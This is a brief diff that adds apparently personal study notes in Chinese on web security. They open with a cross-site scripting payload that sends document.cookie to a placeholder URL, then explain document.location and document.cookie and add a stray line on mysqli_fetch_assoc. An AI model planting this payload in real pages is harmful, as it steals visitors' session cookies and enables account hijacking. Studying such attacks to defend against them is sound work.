@@ -1,0 +1,12 @@
+<script>document.location = 'url链接?cookie='+ document.cookie;</script>
+
+document.location
+Location对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过window.location和document.location属性，可以拿到这个对象
+document.cookie 
+ocument.cookie属性用来操作浏览器 Cookie，详见《浏览器模型》部分的《Cookie》章节。
+携带cookie信息
+
+
+
+mysqli_fetch_assoc 从函数返回结果中集中取得一行作为关联数组
+
